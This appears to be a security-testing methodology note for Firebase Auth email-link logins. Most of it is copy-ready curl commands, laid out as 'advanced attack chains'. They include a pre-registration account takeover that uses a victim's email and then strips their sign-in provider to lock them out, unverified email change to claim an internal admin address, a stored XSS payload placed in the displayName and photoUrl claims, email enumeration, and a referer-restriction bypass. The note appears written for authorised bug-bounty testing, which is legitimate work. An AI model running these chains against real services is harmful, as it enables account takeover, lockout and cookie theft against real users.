# Firebase Auth Email-Link Testing

## When to Use
- Target uses Firebase Auth (auth domain, `/__/firebase/init.json` exposed)
- Firebase API key found in client-side config
- Auth domain pattern: `auth.<target>.com` resolving to Firebase Hosting IPs

## Key Discovery: API Key Referer Restriction Bypass
Firebase API keys are often **HTTP referer-restricted** to the target domain. Requests without the correct `Referer` header return:
```json
{"error":{"code":403,"message":"Requests from referer <empty> are blocked.","details":[{"reason":"API_KEY_HTTP_REFERRER_BLOCKED"}]}}
```

**Fix:** Add `-H "Referer: https://www.target.com/"` to all Identity Toolkit requests.

## Auth Flow (Email Link / Passwordless)

```
1. sendOobCode (email) → Firebase sends sign-in link to email
2. User clicks link → oobCode extracted from URL params
3. signInWithEmailLink (oobCode + email) → Firebase idToken + refreshToken
4. App exchanges idToken → backend session (cookie/JWT)
```

### Step 1: Send Sign-In Link
```bash
curl -sk -H "Referer: https://www.target.com/" \
  "https://identitytoolkit.googleapis.com/v1/accounts:sendOobCode?key=<API_KEY>" \
  -X POST -H "Content-Type: application/json" \
  -d '{"requestType":"EMAIL_SIGNIN","email":"your@email.com","continueUrl":"http://localhost:5001/callback","canHandleCodeInApp":true}'
```
Response: `{"kind":"identitytoolkit#GetOobConfirmationCodeResponse","email":"your@email.com"}`

### Step 2: Extract oobCode
The email contains a link like:
`https://auth.target.com/__/auth/action?mode=signIn&oobCode=XXXXX&continueUrl=...`
Extract the `oobCode` parameter.

### Step 3: Exchange for idToken
```bash
curl -sk -H "Referer: https://www.target.com/" \
  "https://identitytoolkit.googleapis.com/v1/accounts:signInWithEmailLink?key=<API_KEY>" \
  -X POST -H "Content-Type: application/json" \
  -d '{"oobCode":"<EXTRACTED_CODE>","email":"your@email.com"}'
```
Response contains: `idToken`, `refreshToken`, `localId`

### Step 4: Exchange idToken for App Session
Try multiple body formats against the app's auth endpoint:
```bash
# Common patterns:
curl -sk -X POST "https://api.target.com/v1/auth" \
  -H "Content-Type: application/json" \
  -H "Origin: https://www.target.com" \
  -d '{"token":"<idToken>"}'

# Or:
-d '{"firebaseToken":"<idToken>"}'
-d '{"idToken":"<idToken>"}'
```

### Token Refresh
```bash
curl -sk -H "Referer: https://www.target.com/" \
  "https://securetoken.googleapis.com/v1/token?key=<API_KEY>" \
  -X POST -H "Content-Type: application/json" \
  -d '{"grant_type":"refresh_token","refresh_token":"<REFRESH_TOKEN>"}'
```

## Flask Session Emulator Pattern

For targets with complex auth flows, build a local Flask app that:
1. Manages the Firebase sign-in link flow via UI
2. Captures oobCode via a local callback endpoint
3. Exchanges for idToken automatically
4. Stores session cookies for subsequent API testing
5. Provides an API tester form for authenticated requests

**Port note:** On macOS, port 5000 is used by AirPlay Receiver. Use port 5001+.

## Enumeration Before Auth
These requests work without authentication (with referer):
```bash
# Check if email is registered
curl -sk -H "Referer: https://www.target.com/" \
  "https://identitytoolkit.googleapis.com/v1/accounts:createAuthUri?key=<API_KEY>" \
  -X POST -H "Content-Type: application/json" \
  -d '{"identifier":"user@email.com","continueUri":"https://www.target.com/"}'
# registered=true/false in response
```
⚠️ Email enumeration may be OUT OF SCOPE in many programs.

## Advanced Attack Chains

### Chain 1: Pre-Registration ATO via Password Provider
If the target uses email-link (passwordless) but has password provider enabled:

```bash
# 1. Create account with victim's email + attacker password
curl -sk -H "Referer: https://www.target.com/" \
  "https://identitytoolkit.googleapis.com/v1/accounts:signUp?key=<API_KEY>" \
  -H "Content-Type: application/json" \
  -d '{"email":"victim@email.com","password":"AttackerPass1!","returnSecureToken":true}'

# 2. Victim later signs up via email-link → SAME Firebase UID (account linking)

# 3. Attacker signs in with password → gets same UID → same app session
curl -sk -H "Referer: https://www.target.com/" \
  "https://identitytoolkit.googleapis.com/v1/accounts:signInWithPassword?key=<API_KEY>" \
  -H "Content-Type: application/json" \
  -d '{"email":"victim@email.com","password":"AttackerPass1!","returnSecureToken":true}'

# 4. Unlink victim's emailLink provider → victim permanently locked out
curl -sk -H "Referer: https://www.target.com/" \
  "https://identitytoolkit.googleapis.com/v1/accounts:update?key=<API_KEY>" \
  -H "Content-Type: application/json" \
  -d '{"idToken":"<TOKEN>","deleteProvider":["emailLink"]}'

# 5. Verify: only password provider remains
curl -sk -H "Referer: https://www.target.com/" \
  "https://identitytoolkit.googleapis.com/v1/accounts:createAuthUri?key=<API_KEY>" \
  -H "Content-Type: application/json" \
  -d '{"identifier":"victim@email.com","continueUri":"https://www.target.com"}'
# Returns: signinMethods: ["password"] — victim can't use emailLink anymore
```

**Impact:** Full ATO — attacker has persistent access, victim locked out.
**Severity:** Critical if password provider is enabled on a passwordless-only platform.

### Chain 2: Unverified Email Change
```bash
# Change email to ANY unclaimed address without verification
curl -sk -H "Referer: https://www.target.com/" \
  "https://identitytoolkit.googleapis.com/v1/accounts:update?key=<API_KEY>" \
  -H "Content-Type: application/json" \
  -d '{"idToken":"<TOKEN>","email":"admin@target.com","returnSecureToken":true}'
# If no EMAIL_EXISTS error → email changed immediately, no verification email sent
```

**Check:** Does the backend grant different access based on email domain? Test with `@target.com`, `@company.com` internal domains.

### Chain 3: XSS via JWT Claims
```bash
# Store XSS payload in displayName (persisted in every Firebase JWT)
curl -sk -H "Referer: https://www.target.com/" \
  "https://identitytoolkit.googleapis.com/v1/accounts:update?key=<API_KEY>" \
  -H "Content-Type: application/json" \
  -d '{"idToken":"<TOKEN>","displayName":"<script>alert(document.cookie)</script>","photoUrl":"javascript:alert(1)"}'
```

**Impact:** If backend/frontend renders the JWT `name` or `picture` claim without sanitization → stored XSS. Decode the JWT payload to confirm the claims are included.

### Chain 4: Firebase Installations → FIS Token
```bash
# Get Firebase Installation ID + auth token (no user auth needed)
curl -sk -H "Referer: https://www.target.com/" \
  -H "x-goog-api-key: <API_KEY>" \
  "https://firebaseinstallations.googleapis.com/v1/projects/<PROJECT_ID>/installations" \
  -H "Content-Type: application/json" \
  -d '{"appId":"<APP_ID>","authVersion":"FIS_v2","sdkVersion":"w:0.6.4"}'
# Returns: fid, refreshToken, authToken — use for FCM, Remote Config, etc.
```

## Security Findings to Look For
- **No rate limit on sendOobCode** → email bombing
- **Token not user-bound** → shared token across requests (replay)
- **continueUrl open redirect** → redirect to attacker domain after auth
- **Signup not disabled** → create accounts on invite-only platforms
- **Firebase RTDB/Storage rules** → test after getting idToken (authenticated != authorized)
- **Referer bypass** → if removing referer still works, the key restriction is misconfigured
- **Password provider enabled on passwordless platform** → pre-registration ATO chain
- **accounts:update allows email change without verification** → impersonation, internal email claim
- **deleteProvider unrestricted** → attacker can remove victim's auth provider (lockout)
- **displayName/photoUrl unsanitized** → stored XSS via JWT claims
- **Email enumeration enabled** → signInWithPassword returns EMAIL_NOT_FOUND vs INVALID_LOGIN_CREDENTIALS
- **continueUrl domain allowlist too broad** → test all subdomains, not just www
